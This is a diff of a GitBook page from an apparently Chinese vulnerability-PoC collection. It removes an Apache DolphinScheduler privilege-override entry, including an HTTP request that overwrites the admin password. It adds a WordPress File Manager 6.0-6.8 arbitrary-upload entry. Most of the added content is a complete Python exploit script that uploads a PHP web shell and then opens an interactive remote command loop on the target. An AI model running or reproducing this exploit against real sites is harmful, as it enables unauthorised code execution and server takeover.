@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>Apache DolphinScheduler权限覆盖漏洞 · GitBook</title>
+        <title>Wordpress File-manager任意文件上传 · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,10 @@
     <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="Netlogon-privilege_escalation-CVE-2020-1472.html" />
+    <link rel="next" href="yonyou-sqli.html" />
     
     
-    <link rel="prev" href="ExchangeServer-rce-CVE-2020-16875.html" />
+    <link rel="prev" href="WordPress-fileupload.html" />
     
 
     </head>
@@ -129,7 +129,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.2.2" data-path="WordPressfilemanager-fileupload.html">
+        <li class="chapter active" data-level="1.2.2" data-path="WordPressfilemanager-fileupload.html">
             
                 <a href="WordPressfilemanager-fileupload.html">
             
@@ -298,7 +298,7 @@
             
         </li>
     
-        <li class="chapter active" data-level="2.1.4" data-path="DolphinScheduler-privilegeoverride-CVE-2020-13922.html">
+        <li class="chapter " data-level="2.1.4" data-path="DolphinScheduler-privilegeoverride-CVE-2020-13922.html">
             
                 <a href="DolphinScheduler-privilegeoverride-CVE-2020-13922.html">
             
@@ -697,7 +697,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href="." >Apache DolphinScheduler权限覆盖漏洞</a>
+        <a href="." >Wordpress File-manager任意文件上传</a>
     </h1>
 </div>
 
@@ -712,17 +712,91 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="apache-dolphinscheduler&#x6743;&#x9650;&#x8986;&#x76D6;&#x6F0F;&#x6D1E;cve-2020-13922">Apache DolphinScheduler&#x6743;&#x9650;&#x8986;&#x76D6;&#x6F0F;&#x6D1E;(CVE-2020-13922)</h1>
+                                <h1 id="wordpress-file-manager&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;">Wordpress File-manager&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;</h1>
 <blockquote>
 <p>2020.9</p>
 </blockquote>
+<h2 id="&#x5F71;&#x54CD;&#x8303;&#x56F4;">#&#x5F71;&#x54CD;&#x8303;&#x56F4;</h2>
+<p>File Manager 6.0-6.8</p>
 <h2 id="poc">#Poc</h2>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxyeq5h84j30u00ds74z.jpg" alt="img"></p>
-<pre><code class="lang-http">POST /dolphinscheduler/users/update
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxwgz2pscj30za0icdiu.jpg" alt="img"></p>
+<p>&#x8BBF;&#x95EE;<a href="http://x.x.x.x/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php" target="_blank">http://x.x.x.x/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php</a></p>
+<p>python3 file_manager_upload.py -u <a href="http://x.x.x.x" target="_blank">http://x.x.x.x</a></p>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-comment"># -*- coding: UTF-8 -*-</span>
+<span class="hljs-string">&quot;&quot;&quot;
+@Author  : xDroid
+@File    : file_manager_Rce.py
+@Time    : 2020/9/21
+&quot;&quot;&quot;</span>
+<span class="hljs-keyword">import</span> requests
+requests.packages.urllib3.disable_warnings()
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">import</span> json
+<span class="hljs-keyword">import</span> optparse
+<span class="hljs-keyword">import</span> sys
 
-id=1&amp;userName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdluser%40sdluser.sdluser&amp;phone=
+GREEN = <span class="hljs-string">&apos;\033[92m&apos;</span>
+YELLOW = <span class="hljs-string">&apos;\033[93m&apos;</span>
+RED = <span class="hljs-string">&apos;\033[91m&apos;</span>
+ENDC = <span class="hljs-string">&apos;\033[0m&apos;</span>
+
+proxies={ <span class="hljs-string">&apos;http&apos;</span>:<span class="hljs-string">&apos;127.0.0.1:8080&apos;</span>, <span class="hljs-string">&apos;https&apos;</span>:<span class="hljs-string">&apos;127.0.0.1:8080&apos;</span> }
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randmd5</span><span class="hljs-params">()</span>:</span>
+    new_md5 = md5()
+    new_md5.update(str(random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)).encode())
+    <span class="hljs-keyword">return</span> new_md5.hexdigest()[:<span class="hljs-number">6</span>]+<span class="hljs-string">&apos;.php&apos;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file_manager</span><span class="hljs-params">(url)</span>:</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:
+        print(<span class="hljs-string">&apos;#Usage : python3 file_manager_upload.py -u http://127.0.0.1&apos;</span>)
+        sys.exit()
+    vuln_url=url.strip()+<span class="hljs-string">&quot;/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span>
+    filename=randmd5()
+    headers={
+        <span class="hljs-string">&apos;User-Agent&apos;</span>: <span class="hljs-string">&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0&apos;</span>,
+        <span class="hljs-string">&apos;Content-Type&apos;</span>:<span class="hljs-string">&apos;multipart/form-data;boundary=---------------------------42474892822150178483835528074&apos;</span>
+    }
+    data=<span class="hljs-string">&quot;-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\&quot;reqid\&quot;\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\&quot;cmd\&quot;\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\&quot;target\&quot;\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\&quot;upload[]\&quot;; filename=\&quot;%s\&quot;\r\nContent-Type: application/php\r\n\r\n&lt;?php system($_GET[&apos;cmd&apos;]); ?&gt;\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name=\&quot;mtime[]\&quot;\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n&quot;</span>%filename
+    <span class="hljs-keyword">try</span>:
+        resp=requests.post(url=vuln_url,headers=headers,data=data,timeout=<span class="hljs-number">3</span>, verify=<span class="hljs-keyword">False</span>)
+        result = json.loads(resp.text)
+        <span class="hljs-keyword">if</span> filename == result[<span class="hljs-string">&apos;added&apos;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&apos;url&apos;</span>].split(<span class="hljs-string">&apos;/&apos;</span>)[<span class="hljs-number">-1</span>]:
+            print(GREEN+<span class="hljs-string">&apos;[+]\t\t&apos;</span>+ENDC+YELLOW+<span class="hljs-string">&apos;File Uploaded Success\t\t&apos;</span>+ENDC)
+            <span class="hljs-keyword">while</span>(<span class="hljs-keyword">True</span>):
+                command = input(<span class="hljs-string">&quot;&#x8BF7;&#x8F93;&#x5165;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;:&quot;</span>)
+                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;q&quot;</span> == command:
+                    sys.exit()
+                exec_url = url+<span class="hljs-string">&apos;/wp-content/plugins/wp-file-manager/lib/files/&apos;</span>+filename+<span class="hljs-string">&apos;?cmd=&apos;</span>+command.strip()
+                exec_resp = requests.get(url=exec_url)
+                exec_resp.encoding=<span class="hljs-string">&apos;gb2312&apos;</span>
+                print(exec_resp.text)
+
+        <span class="hljs-keyword">else</span>:
+            print(RED+<span class="hljs-string">&apos;[-]\t\tUploaded failed\t\t&apos;</span>+ENDC)
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        print(RED + <span class="hljs-string">&apos;[-]\t\tUploaded failed\t\t&apos;</span> + ENDC)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
+    banner = GREEN+<span class="hljs-string">&apos;&apos;&apos;
+      __ _ _                                                    
+     / _(_) | ___   _ __ ___   __ _ _ __   __ _  __ _  ___ _ __ 
+    | |_| | |/ _ \ | &apos;_ ` _ \ / _` | &apos;_ \ / _` |/ _` |/ _ \ &apos;__|
+    |  _| | |  __/ | | | | | | (_| | | | | (_| | (_| |  __/ |   
+    |_| |_|_|\___| |_| |_| |_|\__,_|_| |_|\__,_|\__, |\___|_|   
+                                                |___/           
+                    by: Timeline Sec
+                    file manager 6.0-6.8 file upload
+    &apos;&apos;&apos;</span>+ENDC
+    print(banner)
+    parser = optparse.OptionParser(<span class="hljs-string">&apos;python3 %prog&apos;</span> + <span class="hljs-string">&apos;-h&apos;</span>)
+    parser.add_option(<span class="hljs-string">&apos;-u&apos;</span>, dest=<span class="hljs-string">&apos;url&apos;</span>, type=<span class="hljs-string">&apos;str&apos;</span>, help=<span class="hljs-string">&apos;wordpress url&apos;</span>)
+    (options, args) = parser.parse_args()
+    file_manager(options.url)
 </code></pre>
-<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxyexfpi7j30u00d979u.jpg" alt="img"></p>
 
                                 
                                 </section>
@@ -750,12 +824,12 @@ id=1&amp;userName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdl
 
             
                 
-                <a href="ExchangeServer-rce-CVE-2020-16875.html" class="navigation navigation-prev " aria-label="Previous page: Exchange Server远程代码执行漏洞">
+                <a href="WordPress-fileupload.html" class="navigation navigation-prev " aria-label="Previous page: WordPress评论插件wpDiscuz 任意文件上传漏洞">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
                 
-                <a href="Netlogon-privilege_escalation-CVE-2020-1472.html" class="navigation navigation-next " aria-label="Next page: Netlogon 特权提升漏洞">
+                <a href="yonyou-sqli.html" class="navigation navigation-next " aria-label="Next page: 用友GRP-u8注入漏洞">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -766,7 +840,7 @@ id=1&amp;userName=admin&amp;userPassword=Password1!&amp;tenantId=1&amp;email=sdl
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Apache DolphinScheduler权限覆盖漏洞","level":"2.1.4","depth":2,"next":{"title":"Netlogon 特权提升漏洞","level":"2.1.5","depth":2,"path":"Netlogon-privilege_escalation-CVE-2020-1472.md","ref":"Netlogon-privilege_escalation-CVE-2020-1472.md","articles":[]},"previous":{"title":"Exchange Server远程代码执行漏洞","level":"2.1.3","depth":2,"path":"ExchangeServer-rce-CVE-2020-16875.md","ref":"ExchangeServer-rce-CVE-2020-16875.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"DolphinScheduler-privilegeoverride-CVE-2020-13922.md","mtime":"2020-10-22T03:34:10.437Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-10-22T03:42:07.725Z"},"basePath":".","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Wordpress File-manager任意文件上传","level":"1.2.2","depth":2,"next":{"title":"用友GRP-u8注入漏洞","level":"1.2.3","depth":2,"path":"yonyou-sqli.md","ref":"yonyou-sqli.md","articles":[]},"previous":{"title":"WordPress评论插件wpDiscuz 任意文件上传漏洞","level":"1.2.1","depth":2,"path":"WordPress-fileupload.md","ref":"WordPress-fileupload.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"WordPressfilemanager-fileupload.md","mtime":"2020-10-22T02:31:43.955Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-10-22T03:42:07.725Z"},"basePath":".","book":{"language":""}});
         });
     </script>
 </div>
